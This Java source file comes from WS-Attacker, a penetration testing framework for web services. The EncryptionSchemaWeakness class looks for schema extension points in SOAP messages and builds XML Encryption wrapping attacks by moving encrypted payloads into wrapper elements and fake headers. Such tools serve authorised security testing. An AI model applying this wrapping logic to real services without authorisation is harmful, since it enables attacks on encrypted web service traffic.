/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */

package wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.weakness;

import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import org.apache.log4j.Logger;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import wsattacker.library.schemaanalyzer.AnyElementProperties;
import wsattacker.library.schemaanalyzer.SchemaAnalyzer;
import wsattacker.library.signatureWrapping.util.exception.InvalidWeaknessException;
import wsattacker.library.signatureWrapping.xpath.analysis.WrapperProperties;
import wsattacker.library.xmlencryptionattack.encryptedelements.AbstractEncryptionElement;
import wsattacker.library.xmlencryptionattack.encryptedelements.key.EncryptedKeyElement;
import wsattacker.library.xmlutilities.dom.DomUtilities;
import wsattacker.library.xmlutilities.namespace.NamespaceConstants;

public class EncryptionSchemaWeakness
    extends AbstractWeaknessComposite
{
    private final List<WrapperProperties> m_WrapperProperties = new ArrayList<WrapperProperties>();

    public final static Logger LOG = Logger.getLogger( EncryptionSchemaWeakness.class );

    private int m_NumPostProcessPossible;

    public EncryptionSchemaWeakness( AbstractEncryptionElement encPay, EncryptedKeyElement encKey )
        throws InvalidWeaknessException
    {
        determineEncSignMode( encPay, encKey );
        this.m_EncKey = encKey;
        this.m_EncPay = encPay;
    }

    public void findSchemaWeakness( SchemaAnalyzer schemaAnalyzer )
        throws InvalidWeaknessException
    {
        Element encPayElement = m_EncPay.getEncryptedElement();
        Document doc = encPayElement.getOwnerDocument();
        List<Element> matched;

        // begin root element
        matched = new ArrayList<Element>();
        matched.add( doc.getDocumentElement() );

        LOG.info( "init: Matched " + matched.toString() );
        Set<AnyElementProperties> schemaWeaknesses;
        for ( Element ele : matched )
        {
            schemaWeaknesses = schemaAnalyzer.findExpansionPoint( ele );
            for ( AnyElementProperties extension : schemaWeaknesses )
            {
                WrapperProperties wp = new WrapperProperties( extension, encPayElement );

                int factor = ( wp.isWrapperNeeded() ? 1 : 2 );
                if ( LOG.isDebugEnabled() )
                {
                    LOG.debug( String.format( "Parent: %s / Positions: %d / wrapper needed? %b",
                                              extension.getDocumentElement().getNodeName(), wp.getPossiblePositions(),
                                              wp.isWrapperNeeded() ) );
                }
                m_PossibleWeaks += ( factor * wp.getPossiblePositions() );
                m_WrapperProperties.add( wp );
            }
        }

        // PostProcessWeakness
        EncryptionAttributeIdWeakness aw =
            (EncryptionAttributeIdWeakness) FactoryWeakness.generateWeakness( WeaknessType.ATTR_ID_WEAKNESS, m_EncPay,
                                                                              m_EncKey );
        if ( 0 < aw.getPossibleNumWeaks() )
        {
            m_WeaknessList.add( aw );
            m_NumPostProcessPossible += aw.getPossibleNumWeaks();
        }

    }

    @Override
    public void abuseWeakness( int index, Element encKey, Element payloadElement )
    {
        boolean useRealWrapper = true;
        int wrapperPropertiesIndex = -1;
        int childIndex = -1;

        if ( index >= getPossibleNumWeaks() )
        {
            String warn = String.format( "Index >= numberOfPossibilites (%d >= %d)", index, m_PossibleWeaks );
            LOG.warn( warn );
            throw new IllegalArgumentException( warn );
        }

        // detect postProcess to use
        int postProcessListIndex = -1;
        int postProcessAbuseIndex = 0;
        for ( AbstractEncryptionWeakness aw : m_WeaknessList )
        {
            ++postProcessListIndex;
            if ( index > m_PossibleWeaks * aw.getPossibleNumWeaks() )
            {
                index -= m_PossibleWeaks * aw.getPossibleNumWeaks();
            }
            else
            {
                while ( index >= m_PossibleWeaks )
                {
                    index -= m_PossibleWeaks;
                    ++postProcessAbuseIndex;
                }
                break;
            }
        }

        for ( int i = 0; i < m_WrapperProperties.size(); ++i )
        {
            WrapperProperties wp = m_WrapperProperties.get( i );

            if ( index < wp.getPossiblePositions() )
            {
                childIndex = index;
                wrapperPropertiesIndex = i;
                break;
            }

            if ( !wp.isWrapperNeeded() )
            {
                index -= wp.getPossiblePositions();
                if ( index < wp.getPossiblePositions() )
                {
                    childIndex = index;
                    useRealWrapper = false;
                    wrapperPropertiesIndex = i;
                    break;
                }
            }

            index -= wp.getPossiblePositions();
        }

        try
        {
            abuseWeakness( wrapperPropertiesIndex, childIndex, useRealWrapper, encKey, payloadElement,
                           postProcessListIndex, postProcessAbuseIndex );
        }
        catch ( InvalidWeaknessException ex )
        {
            LOG.error( ex );
        }
    }

    protected void abuseWeakness( int wrapperPropertiesIndex, int childIndex, boolean useRealWrapper, Element encKey,
                                  Element payloadElement, int postProcessListIndex, int postProcessAbuseIndex )
        throws InvalidWeaknessException
    {
        // Which Schema-Weakness to abuse:
        // ////////////////////////////////
        WrapperProperties wrapperProperty = m_WrapperProperties.get( wrapperPropertiesIndex );
        AnyElementProperties anyElementProperties = wrapperProperty.getAnyElementPorperties();

        // The parent of the wrapper to place
        Element wrapperParent =
            DomUtilities.findCorrespondingElement( payloadElement.getOwnerDocument(),
                                                   anyElementProperties.getDocumentElement() );
        // the concrete wrapper element, can be the same as the parent!
        Element wrapper;
        // Do we use a ns1:wrapper Element or just use the signed Element?
        // ////////////////////////////////////////////////////////////////
        if ( useRealWrapper )
        {
            LOG.trace( "Surrounding singnedPostPart with real Wrapper Element!" );
            wrapper =
                wrapperParent.getOwnerDocument().createElementNS( NamespaceConstants.URI_NS_WSATTACKER,
                                                                  NamespaceConstants.PREFIX_NS_WSATTACKER + ":wrapper" );
            wrapper.appendChild( payloadElement );
        }
        else
        {
            wrapper = payloadElement;
        }
        // Handle "strict" namspace-case
        // If processContents="strict" append soapenv:Header>ns:Wrapper
        if ( anyElementProperties.getProcessContentsAttribute().equals( "##strict" ) )
        {
            // Create a fake soap:Header element, as the XML Schema for this must be known
            Element env = wrapper.getOwnerDocument().getDocumentElement();
            Element tmp = env.getOwnerDocument().createElementNS( env.getNamespaceURI(), env.getPrefix() + ":Header" );
            tmp.appendChild( wrapper );
            wrapper = tmp;
        }

        // At which Position?
        // ///////////////////
        List<Element> children = DomUtilities.getAllChildElements( wrapperParent );
        if ( childIndex < children.size() )
        {
            if ( LOG.isDebugEnabled() )
            {
                LOG.trace( "Inserting Wrapper " + wrapper.getNodeName() + " before "
                    + children.get( childIndex ).getNodeName() + " Element as a child of "
                    + wrapperParent.getNodeName() );
            }
            wrapperParent.insertBefore( wrapper, children.get( childIndex ) );
        }
        else
        {
            if ( LOG.isDebugEnabled() )
            {
                LOG.trace( "Appending Wrapper on " + wrapperParent.getNodeName() );
            }
            wrapperParent.appendChild( wrapper );
        }

        // Post Process
        // /////////////
        if ( postProcessListIndex >= 0 )
        {
            m_WeaknessList.get( postProcessListIndex ).abuseWeakness( postProcessAbuseIndex, encKey, payloadElement );
        }

    }

    public List<WrapperProperties> getWrapperProperties()
    {
        return m_WrapperProperties;
    }

    @Override
    public int getPossibleNumWeaks()
    {
        return m_NumPostProcessPossible > 0 ? m_PossibleWeaks * m_NumPostProcessPossible : m_PossibleWeaks;
    }
}
